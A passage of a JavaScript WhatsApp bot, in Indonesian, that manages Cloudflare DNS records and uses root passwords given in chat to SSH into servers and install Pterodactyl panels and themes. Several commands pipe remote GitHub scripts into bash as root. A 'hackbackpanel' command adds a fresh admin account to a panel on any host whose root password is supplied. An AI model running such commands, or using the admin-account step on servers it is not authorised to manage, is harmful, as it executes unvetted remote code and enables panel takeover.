                    name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                    content: ip.replace(/[^0-9.]/gi, ""),
                    ttl: 3600,
                    priority: 10,
                    proxied: false
                },
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json"
                    }
                }
            );

            const res = response.data;
            if (res.success) {
                return {
                    success: true,
                    zone: res.result?.zone_name || "Tidak diketahui",
                    name: res.result?.name || "Tidak diketahui",
                    ip: res.result?.content || ip
                };
            } else {
                return { success: false, error: "Gagal membuat subdomain" };
            }
        } catch (e) {
            const errorMsg = e.response?.data?.errors?.[0]?.message || e.message || "Terjadi kesalahan";
            return { success: false, error: errorMsg };
        }
    }

    const result = await createSubDomain(host.toLowerCase(), ip);
    
    if (result.success) {
        let teks = `✅ *Berhasil membuat subdomain*\n\n🌐 *Subdomain:* ${result.name}\n📌 *IP Server:* ${result.ip}`;
        await hereply(teks);
        await hereply(result.name);
    } else {
        await hereply(`❌ Gagal membuat subdomain:\n${result.error}`);
    }
}
break;        
        
case "delsubdo": {
    if (!isCreator && !isPremium) return hereply(mess.premium)

    if (!args[0]) return hereply(example(`Subdomainnya\n\nContoh:\n*${cmd}* panel.example.com\n> Note: Hanya bisa menghapus subdomain yang domainnya ada pada global.subdomain`));

    let recordName = args[0].toLowerCase();
    const dom = Object.keys(global.subdomain);

    async function listDNSRecords(tldnya) {
        let records = [];
        let page = 1;

        while (true) {
            try {
                const res = await axios.get(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records?page=${page}`,
                    {
                        headers: {
                            Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json"
                        }
                    }
                );

                if (res.data.success) {
                    records.push(...res.data.result);

                    if (res.data.result_info.page < res.data.result_info.total_pages) {
                        page++;
                    } else {
                        return { success: true, records };
                    }
                } else {
                    return { success: false, error: "Gagal mengambil data DNS records." };
                }
            } catch (err) {
                return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
            }
        }
    }

    async function deleteDNSRecord(tldnya, recordId) {
        try {
            const res = await axios.delete(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records/${recordId}`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json"
                    }
                }
            );

            if (res.data.success) {
                return { success: true };
            } else {
                return { success: false, error: "Gagal menghapus DNS record." };
            }
        } catch (err) {
            return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
        }
    }

    let recordFound = false;

    for (let tldnya of dom) {
        let recordsResponse = await listDNSRecords(tldnya);

        if (recordsResponse.success) {
            let record = recordsResponse.records.find((r) => r.name.toLowerCase() === recordName);

            if (record) {
                recordFound = true;
                let deleteResponse = await deleteDNSRecord(tldnya, record.id);

                if (deleteResponse.success) {
                    return hereply(`✅ *Berhasil menghapus DNS record*\n\n📌 *Type:* ${record.type}\n🌐 *Name:* ${record.name}\n🔗 *Alamat IP:* ${record.content}`);
                } else {
                    return hereply(`❌ Gagal menghapus DNS record: ${deleteResponse.error}`);
                }
            }
        }

        if (recordFound) break;
    }

    if (!recordFound) {
        return hereply(`⚠️ DNS record dengan nama *${recordName}* tidak ditemukan.`);
    }
}
break;        

case "delallsubdo": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!args[0]) {
        let dom = Object.keys(global.subdomain);
        if (dom.length === 0) return hereply("❌ Tidak ada domain yang tersedia saat ini.");

        let list = dom.map((i, index) => ({
            header: `(${index + 1}) ${i}`,
            title: `Hapus Semua DNS Record Dari Domain ${i}`,
            id: `${prefix}delallsubdo ${i}`
        }));

        return linux.sendMessage(m.chat, {
            buttons: [{
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Domain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                        sections: [{
                            title: '# Silahkan Pilih Salah Satu Domain Di Bawah',
                            highlight_label: ``,
                            rows: list
                        }]
                    })
                }
            }],
            footer: `*${botname}*`,
            headerType: 1,
            viewOnce: true,
            text: "Silahkan Pilih Domain Yang Ingin Dihapus Semua DNS Recordnya",
            contextInfo: {
                isForwarded: true, 
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
            }
        }, { quoted: m });
    }

    const domain = args[0].toLowerCase();
    const tldnya = Object.keys(global.subdomain).find((key) => key.toLowerCase() === domain);

    if (!tldnya) return hereply(`Domain *${domain}* tidak ditemukan!`);

    async function listAllDNSRecords(tldnya) {
        let allRecords = [];
        let page = 1;

        while (true) {
            try {
                const res = await axios.get(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                    {
                        headers: {
                            Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json",
                        },
                        params: { page, per_page: 50 },
                    }
                );

                if (res.data.success) {
                    allRecords.push(...res.data.result);
                    if (res.data.result_info.page >= res.data.result_info.total_pages) break;
                    page++;
                } else {
                    return { success: false, error: "Gagal mengambil data DNS records." };
                }
            } catch (err) {
                return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
            }
        }

        return { success: true, records: allRecords };
    }

    async function deleteDNSRecord(tldnya, recordId) {
        try {
            const res = await axios.delete(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records/${recordId}`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json",
                    },
                }
            );

            return res.data.success ? { success: true } : { success: false, error: "Gagal menghapus DNS record." };
        } catch (err) {
            return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
        }
    }

    const dnsRecords = await listAllDNSRecords(tldnya);
    if (!dnsRecords.success) return hereply(`Gagal mengambil daftar DNS records untuk domain *${domain}*.\n${dnsRecords.error}`);
    if (dnsRecords.records.length === 0) return hereply(`Tidak ada DNS records yang ditemukan untuk domain *${domain}*.`);

    let successCount = 0;
    let failCount = 0;
    let failDetails = [];

    await hereply(`⏳ Sedang memproses penghapusan seluruh DNS records dari domain *${domain}*\n\nHarap tunggu beberapa menit, ini mungkin memakan waktu.`);

    for (let record of dnsRecords.records) {
        let delRes = await deleteDNSRecord(tldnya, record.id);
        if (delRes.success) {
            successCount++;
        } else {
            failCount++;
            failDetails.push({ name: record.name, error: delRes.error });
        }

        await new Promise(resolve => setTimeout(resolve, 500)); // Jeda 500ms untuk menghindari rate limit
    }

    let teks = `*Hasil Penghapusan DNS Records*\n\n`;
    teks += `*Domain:* ${domain}\n`;
    teks += `*Berhasil Dihapus:* ${successCount}\n`;
    teks += `*Gagal Dihapus:* ${failCount}\n`;

    if (failCount > 0) {
        teks += `\n*Detail Kegagalan:*\n`;
        failDetails.forEach((fail, idx) => {
            teks += `${idx + 1}. *Name:* ${fail.name}\n   *Error:* ${fail.error}\n`;
        });
    }

    return hereply(teks);
}
break;        
        
case "listdns": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    let dom = Object.keys(global.subdomain);

    if (dom.length === 0) return hereply("❌ Tidak ada domain yang tersedia saat ini.");

    let list = dom.map((i, index) => ({
        header: `(${index + 1}) ${i}`,
        title: `Lihat List DNS Record ${i}`,
        id: `${prefix}res_list_dns_record ${i}`
    }));

    await linux.sendMessage(m.chat, {
        buttons: [{
            buttonId: 'action',
            buttonText: { displayText: 'Pilih Domain' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                    sections: [{
                        title: '# Silahkan Pilih Salah Satu Domain Di Bawah',
                        highlight_label: ``,
                        rows: list
                    }]
                })
            }
        }],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: "Pilih Domain Yang Ingin Dilihat List DNS Recordnya",
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    }, { quoted: m });
}
break;
        
case "res_list_dns_record": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!args[0]) return;
    
    const subdomain = args[0].toLowerCase();
    const page = args[1] ? parseInt(args[1]) : 1;
    const perPage = 100;

    if (!global.subdomain[subdomain]) 
        return hereply(`❌ Subdomain *${subdomain}* tidak ditemukan!`);

    async function listDNSRecords(subdomain, page) {
        try {
            const res = await axios.get(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[subdomain].zone}/dns_records`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[subdomain].apitoken}`,
                        "Content-Type": "application/json",
                    },
                    params: { per_page: perPage, page: page },
                }
            );

            if (res.data.success) {
                const records = res.data.result.map((record) => ({
                    id: record.id,
                    type: record.type,
                    name: record.name,
                    content: record.content,
                    proxied: record.proxied,
                    created_on: record.created_on,
                    modified_on: record.modified_on,
                }));

                return {
                    success: true,
                    records,
                    totalRecords: res.data.result_info.total_count || 0,
                    totalPages: res.data.result_info.total_pages || 1,
                };
            } else {
                return { success: false, error: "Gagal mengambil data DNS records." };
            }
        } catch (err) {
            return { 
                success: false, 
                error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." 
            };
        }
    }

    function formatDateWithDay(dateString) {
        const date = new Date(dateString);
        const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
        const day = days[date.getDay()];
        const datePart = date.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' });
        const timePart = date.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        return `${day}, ${datePart} Pukul ${timePart}`;
    }

    const dnsRecords = await listDNSRecords(subdomain, page);
    if (!dnsRecords.success) return hereply(`❌ ${dnsRecords.error}`);
    if (dnsRecords.records.length === 0) 
        return hereply(`⚠ Tidak ada DNS records untuk domain *${subdomain}*.`);

    let teks = `📌 *Daftar DNS Records untuk domain:* *${subdomain}*\n`;
    teks += `━━━━━━━━━━━━━━━━━━━━━━\n`;

    let list = [];

    dnsRecords.records.forEach((record, index) => {
        teks += `🔹 *${index + 1 + (page - 1) * perPage}.*\n`;
        teks += `   ➜ *Nama:* ${record.name}\n`;
        teks += `   ➜ *Tipe:* ${record.type}\n`;
        teks += `   ➜ *Tujuan:* ${record.content}\n`;
        teks += `   ➜ *Proxy:* ${record.proxied ? "✔ Diaktifkan" : "❌ Tidak aktif"}\n`;
        teks += `   ➜ *Dibuat:* ${formatDateWithDay(record.created_on)}\n`;
        teks += `   ➜ *Diubah:* ${formatDateWithDay(record.modified_on)}\n`;
        teks += `━━━━━━━━━━━━━━━━━━━━━━\n`;

        list.push({
            title: `🗑 Hapus: ${record.name} (${record.type})`,
            description: `Alamat IP: ${record.content}`,
            id: `${prefix}delsubdo ${record.name}`
        });
    });

    teks += `📌 *Halaman:* ${page}/${dnsRecords.totalPages}\n`;
    teks += `📌 *Total DNS Records:* ${dnsRecords.totalRecords}\n`;

    await linux.sendMessage(m.chat, {
        buttons: [{ buttonId: `${prefix}res_del_all_dns_records ${subdomain}`, buttonText: { displayText: '🗑 Hapus Semua DNS Records' }, type: 1 },
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih DNS Record" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "HAPUS DNS RECORD",
                        sections: [{ title: "# Silahkan Pilih Record Yang Ingin Dihapus", rows: [...list] }]
                    })
                }
            }
        ],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
    }, { quoted: qfake });

    let buttons = [];

    if (dnsRecords.totalPages > 1) {
        if (page > 1) {
            buttons.push({
                buttonId: `${cmd} ${subdomain} ${page - 1}`,
                buttonText: { displayText: `⬅️ Halaman ${page - 1}` },
                type: 1
            });
        }
        if (page < dnsRecords.totalPages) {
            buttons.push({
                buttonId: `${cmd} ${subdomain} ${page + 1}`,
                buttonText: { displayText: `➡️ Halaman ${page + 1}` },
                type: 1
            });
        }

        await sleep(2000);
        await linux.sendMessage(m.chat, {
            buttons,
            footer: `*${botname}*`,
            headerType: 1,
            viewOnce: true,
            text: "Klik tombol di bawah untuk melihat halaman lain",
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            },
        }, { quoted: m });
    }
}
break;
        
case "hbpanel": case "hackbackpanel": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    
    let t = text.split('|');
    if (t.length < 2) return hereply(example("ipvps|pwvps"));

    await linux.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    let ipvps = t[0];
    let passwd = t[1];

    const newuser = "admin" + getRandom("");
    const newpw = "admin" + getRandom("");

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {    
                let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`;
                await hereply(teks);
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("7\n");
                stream.write(`${newuser}\n`);
                stream.write(`${newpw}\n`);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break;
  
case "installpanel": {
if (!isCreator && !isPremium) return hereply(mess.premium)
if (!text) return hereply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return gadzreply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))

const ress = new Client();
const connSettings = {
 host: vii[0].trim(),
 port: '22',
 username: 'root',
 password: vii[1].trim()
}

const randomValue1 = getRandom("");
const randomValue2 = getRandom("");
const user = "admin" + randomValue1;
const pass = "admin" + randomValue2;
const domainpanel = vii[2].trim();
const domainnode = vii[3].trim();
const ramserver = vii[4].trim();
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
    try {
        ress.exec(commandPanel, (err, stream) => {
            if (err) {
                console.error("❌ Gagal menjalankan commandPanel:", err);
                return hereply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    ress.exec('bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)', async (err, stream) => {
                        if (err) {
                            console.error("❌ Gagal menjalankan createnode.sh:", err);
                            return hereply(`❌ Gagal menjalankan createnode.sh.\n\n📌 *Detail:*\n${err.message}`);
                        }

                        stream.on('close', async () => {
                            let teks = `*📦 Berikut Detail Akun Admin Panel:*

* *Username :* ${user}
* *Password :* ${pass}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Dibuat Oleh Bot Untuk Menjalankan Wings.

*Cara Menjalankan Wings:*
ketik *${prefix}startwings* ipvps|pwvps|tokenwings`;
                            await linux.sendMessage(m.chat, { text: teks }, { quoted: m });
                        });

                        stream.on('data', async (data) => {
                            console.log(data.toString());
                            if (data.toString().includes("Masukkan nama lokasi: ")) {
                                stream.write('SGP\n');
                            }
                            if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                                stream.write('VPS HIGH QUALITY BY linuxhere\n');
                            }
                            if (data.toString().includes("Masukkan domain: ")) {
                                stream.write(`${domainnode}\n`);
                            }
                            if (data.toString().includes("Masukkan nama node: ")) {
                                stream.write('Node By linuxhere\n');
                            }
                            if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                                stream.write(`${ramserver}\n`);
                            }
                            if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                                stream.write(`${ramserver}\n`);
                            }
                            if (data.toString().includes("Masukkan Locid: ")) {
                                stream.write('1\n');
                            }
                        });

                        stream.stderr.on('data', async (data) => {
                            console.error("STDERR:", data.toString());
                        });
                    });
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalWings:", error);
                    hereply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());
                if (data.toString().includes('Input 0-6')) {
                    stream.write('1\n');
                }
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Enter the panel address (blank for any address)')) {
                    stream.write(`${domainpanel}\n`);
                }
                if (data.toString().includes('Database host username (pterodactyluser)')) {
                    stream.write(`${user}\n`);
                }
                if (data.toString().includes('Database host password')) {
                    stream.write(`${pass}\n`);
                }
                if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
                    stream.write('admin@gmail.com\n');
                }
            });

            stream.stderr.on('data', (data) => {
                console.error("STDERR:", data.toString());
            });

        });
    } catch (error) {
        console.error("❌ Gagal menginstall Wings:", error);
        hereply(`❌ Gagal menginstall Wings.\n\n📌 *Detail:*\n${error.message}`);
    }
}

async function instalPanel() {
    try {
        ress.exec(commandPanel, (err, stream) => {
            if (err) {
                console.error("❌ Gagal menjalankan commandPanel:", err);
                return hereply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    await instalWings();
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalWings:", error);
                    hereply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());

                if (data.toString().includes('Input 0-6')) stream.write('0\n');
                if (data.toString().includes('(y/N)')) stream.write('y\n');
                if (data.toString().includes('Database name (panel)')) stream.write(`${user}\n`);
                if (data.toString().includes('Database username (pterodactyl)')) stream.write(`${user}\n`);
                if (data.toString().includes('Password (press enter to use randomly generated password)')) stream.write(`${pass}\n`);
                if (data.toString().includes('Select timezone [Europe/Stockholm]')) stream.write('Asia/Jakarta\n');
                if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) stream.write('admin@gmail.com\n');
                if (data.toString().includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
                if (data.toString().includes('Username for the initial admin account')) stream.write(`${user}\n`);
                if (data.toString().includes('First name for the initial admin account')) stream.write('adm\n');
                if (data.toString().includes('Last name for the initial admin account')) stream.write('adm\n');
                if (data.toString().includes('Password for the initial admin account')) stream.write(`${pass}\n`);
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) stream.write(`${domainpanel}\n`);
                if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) stream.write('y\n');
                if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) stream.write('1\n');
                if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) stream.write('y\n');
                if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) stream.write('y\n');
                if (data.toString().includes('(yes/no)')) stream.write('yes\n');
                if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Still assume SSL? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Please read the Terms of Service')) stream.write('y\n');
                if (data.toString().includes('(A)gree/(C)ancel:')) stream.write('A\n');
            });

            stream.stderr.on('data', (data) => {
                console.error("STDERR:", data.toString());
            });

        });
    } catch (error) {
        console.error("❌ Gagal menginstall panel:", error);
        hereply(`❌ Gagal menginstall panel.\n\n📌 *Detail:*\n${error.message}`);
    }
}

ress.on('ready', async () => {
    try {
        await hereply("Memproses *install panel* \nTunggu 5 menit ke depan hingga proses selesai");

        ress.exec(deletemysql, async (err, stream) => {
            if (err) {
                console.error("❌ Error saat menjalankan deletemysql:", err);
                return hereply(`❌ Gagal menjalankan perintah deletemysql.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    await instalPanel();
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalPanel:", error);
                    return hereply(`❌ Gagal menjalankan instalPanel.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());
                await stream.write('\t');
                await stream.write('\n');
            });

            stream.stderr.on('data', async (data) => {
                console.error("STDERR:", data.toString());
            });
        });

    } catch (error) {
        console.error("❌ Terjadi kesalahan saat memproses install panel:", error);
        return hereply(`❌ Terjadi kesalahan saat memproses install panel.\n\n📌 *Detail:*\n${error.message}`);
    }
});

try {
    ress.connect(connSettings);
} catch (error) {
    console.error("❌ Gagal menghubungkan ke server:", error);
    hereply(`❌ Gagal menghubungkan ke server.\n\n📌 *Detail:*\n${error.message}`);
}

}
break;        
        
case "startwings": 
case "configurewings": {
    if (!isCreator && !isPremium) return hereply(mess.premium)

    let t = text.split('|');
    if (t.length < 3) return hereply(example("ipvps|pwvps|token_node"));

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await hereply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                hereply('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
}
break;        
        
case "uninstallpanel": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://pterodactyl-installer.se)`;
    const ress = new Client();

    ress.on('ready', async () => {
        await hereply("Memproses *uninstall panel*\nTunggu 1 menit ke depan hingga proses selesai...");

        ress.exec(command, async (err, stream) => {
            if (err) throw err;

            stream.on('close', async () => {
                await hereply("Berhasil *uninstall panel* ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());

                if (data.toString().includes(`Input 0-6`)) stream.write("6\n");
                if (data.toString().includes(`(y/N)`)) stream.write("y\n");
                if (data.toString().includes(`* Choose the panel user (to skip don't input anything):`)) stream.write("\n");
                if (data.toString().includes(`* Choose the panel database (to skip don't input anything):`)) stream.write("\n");
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
                hereply('Terjadi kesalahan saat proses uninstall panel.');
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;      
        
case "uninstalltema": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));
    
    const [ipvps, pwvps] = text.split("|").map(v => v.trim());
    if (!ipvps || !pwvps) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps.trim(),
        port: '22',
        username: 'root',
        password: pwvps.trim()
    };
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    try {
        await hereply("Memproses *uninstall* tema pterodactyl\nTunggu 3 menit ke depan hingga proses selesai");

        ress.on('ready', () => {
            ress.exec(command, (err, stream) => {
                if (err) {
                    console.error("❌ Kesalahan saat menjalankan perintah:", err);
                    return hereply("Terjadi kesalahan saat mengeksekusi perintah.");
                }
                
                stream.on('close', async (code, signal) => {    
                    await hereply("✅ Berhasil *uninstall* tema pterodactyl");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`2\n`);
                    stream.write(`y\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.error("❌ STDERR:", data.toString());
                });
            });
        }).on('error', (err) => {
            console.error("❌ Kesalahan Koneksi:", err);
            hereply("❌ Gagal terhubung ke VPS. Periksa IP dan kata sandi.");
        }).connect(connSettings);
    } catch (error) {
        console.error("❌ Terjadi Kesalahan:", error);
        hereply("❌ Terjadi kesalahan yang tidak terduga.");
    }
}
break;        
        
case "installtemastellar": 
case "installtemastelar": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *tema stellar* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await hereply("Berhasil install *tema stellar* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`1\n`);
                stream.write(`1\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemabilling": 
case "instaltemabiling": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *tema billing* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await hereply("Berhasil install *tema billing* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`1\n`);
                stream.write(`2\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemaenigma": 
case "instaltemaenigma": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));

    const [ipvps, passwd, linkwa, linkgc1, linkgc2, linkch] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd || !linkwa || !linkgc1 || !linkgc2 || !linkch) 
        return hereply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *tema enigma* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await hereply("Berhasil install *tema enigma* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('3\n');
                stream.write(`${linkwa}\n`);
                stream.write(`${linkgc1}\n`);
                stream.write(`${linkgc2}\n`);
                stream.write(`${linkch}\n`);
                stream.write('yes\n');
                stream.write('x\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

